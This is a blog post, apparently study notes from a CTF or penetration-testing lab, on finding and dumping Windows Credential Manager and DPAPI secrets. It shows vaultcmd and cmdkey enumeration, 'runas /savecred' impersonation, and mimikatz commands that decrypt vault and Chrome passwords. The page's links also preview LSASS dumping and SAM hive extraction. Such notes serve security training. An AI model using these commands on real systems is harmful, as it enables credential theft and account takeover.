@@ -1,0 +1,199 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DPAPI | Twistzz</title><meta name="author" content="Twistzz"><meta name="copyright" content="Twistzz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Default LocationCredentials are stored in special encrypted folders on the computer under the user and system profiles :  %UserProfile%\AppData\Local\Microsoft\Vault\ %UserProfile%\AppData\Local\Micro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DPAPI">
+<meta property="og:url" content="https://twistzz-ctf.github.io/2025/11/26/DPAPI/index.html">
+<meta property="og:site_name" content="Twistzz">
+<meta property="og:description" content="Default LocationCredentials are stored in special encrypted folders on the computer under the user and system profiles :  %UserProfile%\AppData\Local\Microsoft\Vault\ %UserProfile%\AppData\Local\Micro">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://twistzz-ctf.github.io/images/avatar.png">
+<meta property="article:published_time" content="2025-11-26T08:27:51.000Z">
+<meta property="article:modified_time" content="2026-08-18T23:24:50.819Z">
+<meta property="article:author" content="Twistzz">
+<meta property="article:tag" content="Dump-DPAPI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twistzz-ctf.github.io/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "DPAPI",
+  "url": "https://twistzz-ctf.github.io/2025/11/26/DPAPI/",
+  "image": "https://twistzz-ctf.github.io/images/avatar.png",
+  "datePublished": "2025-11-26T08:27:51.000Z",
+  "dateModified": "2026-08-18T23:24:50.819Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Twistzz",
+      "url": "https://twistzz-ctf.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.ico"><link rel="canonical" href="https://twistzz-ctf.github.io/2025/11/26/DPAPI/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DPAPI',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/avatar.png" alt="Logo"><span class="site-name">Twistzz</span></a><a class="nav-page-title" href="/"><span class="site-name">DPAPI</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div></div></nav><div id="post-info"><h1 class="post-title">DPAPI</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-26T08:27:51.000Z" title="Created 2025-11-26 09:27:51">2025-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-08-18T23:24:50.819Z" title="Updated 2026-08-19 00:24:50">2026-08-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/">Active Directory</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/">Windows</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/Post-Exploitation/">Post-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/Post-Exploitation/Dump-Passwords/">Dump-Passwords</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles :</p>
+<ul>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
+<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
+<li><code>%ProgramData%\Microsoft\Vault\</code></li>
+<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
+</ul>
+<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
+<li>Website passwords.</li>
+<li>Online account logins</li>
+</ul>
+<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
+<li>Network shares (like <code>\\server\share</code>)</li>
+<li>Domain user logins</li>
+<li>Services (OneDrive, etc.)</li>
+<li>Remote desktop connections</li>
+</ul>
+<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
+<p>For standard vaults</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line"></span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
+
+<p>For stored credentials</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list</span><br><span class="line"></span><br><span class="line">Currently stored credentials:</span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical</span><br><span class="line"><span class="built_in">Type</span>: Generic</span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt</span><br><span class="line">Local machine persistence</span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com</span><br><span class="line"><span class="built_in">Type</span>: Generic</span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
+
+<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
+<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
+<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
+
+<p>➜ This will create a new <code>powershell</code> process.</p>
+<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io">Twistzz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io/2025/11/26/DPAPI/">https://twistzz-ctf.github.io/2025/11/26/DPAPI/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Dump-DPAPI/">Dump-DPAPI</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/26/Dump-Lsass/" title="Dump Lsass"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Dump Lsass</div></div><div class="info-2"><div class="info-item-1">Create a dump fileTask ManagerSelect the process from task manager  Create a dump file  ➜ And then we can find the created file on &#96;C:\Users\username\AppData\Local\Temp\Lsass.DMP. PowerShellFinding LSASS’s PID in PowerShell12345PS C:\Windows\system32&gt; Get-Process lsassHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------   1260      21     4948      15396       2.56    672   0 lsass  Creating a dump fi...</div></div></div></a><a class="pagination-related" href="/2025/11/25/Extracting-Passwords-from-Windows-Systems/" title="Extracting Passwords from Windows Registry."><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Extracting Passwords from Windows Registry.</div></div><div class="info-2"><div class="info-item-1">Dump SAM, SYSTEM, And SECURITYOfflineCopy RegistryKey Registry Hives:  HKLM\SAM - Contains local user password hashes  HKLM\SYSTEM - Contains boot key to decrypt SAM  HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets   12345C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.saveC:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.saveC:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save  SecretsdumpDump hash1impacket-secretsdump -sam sam.save -security...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Twistzz</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">417</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">66</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Twistzz-cb" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Default-Location"><span class="toc-number">1.</span> <span class="toc-text">Default Location</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Two-Main-Types-of-Stored-Credentials"><span class="toc-number">2.</span> <span class="toc-text">Two Main Types of Stored Credentials:</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Web-Credentials"><span class="toc-number">2.1.</span> <span class="toc-text">Web Credentials</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Windows-Credentials"><span class="toc-number">2.2.</span> <span class="toc-text">Windows Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerate-All-vaults"><span class="toc-number">3.</span> <span class="toc-text">Enumerate All vaults</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerate-Specific-vault"><span class="toc-number">4.</span> <span class="toc-text">Enumerate Specific vault</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-Credentials-1"><span class="toc-number">4.1.</span> <span class="toc-text">Web Credentials</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-Credentials-1"><span class="toc-number">4.2.</span> <span class="toc-text">Windows Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impersonate-User-In-general-it-doesn%E2%80%99t-need-admin-privilege"><span class="toc-number">5.</span> <span class="toc-text">Impersonate User ( In general, it doesn’t need admin privilege )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dump-Credentials"><span class="toc-number">6.</span> <span class="toc-text">Dump Credentials</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mimikatz"><span class="toc-number">6.1.</span> <span class="toc-text">mimikatz</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/07/Abusing-Foreign-Group-Membership/" title="Abusing Foreign Group Membership">Abusing Foreign Group Membership</a><time datetime="2026-07-07T07:29:09.000Z" title="Created 2026-07-07 08:29:09">2026-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Forest-Trust-Enumeration/" title="Forest Trust Enumeration">Forest Trust Enumeration</a><time datetime="2026-07-06T14:00:25.000Z" title="Created 2026-07-06 15:00:25">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Child-Parent-Trust-Enumeration/" title="Child-Parent Trust Enumeration">Child-Parent Trust Enumeration</a><time datetime="2026-07-06T13:42:32.000Z" title="Created 2026-07-06 14:42:32">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Users-Groups/" title="Users &amp; Groups">Users &amp; Groups</a><time datetime="2026-07-06T13:13:08.000Z" title="Created 2026-07-06 14:13:08">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Domain-and-ACLs/" title="Domain and ACLs">Domain and ACLs</a><time datetime="2026-07-06T12:24:06.000Z" title="Created 2026-07-06 13:24:06">2026-07-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Twistzz</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>
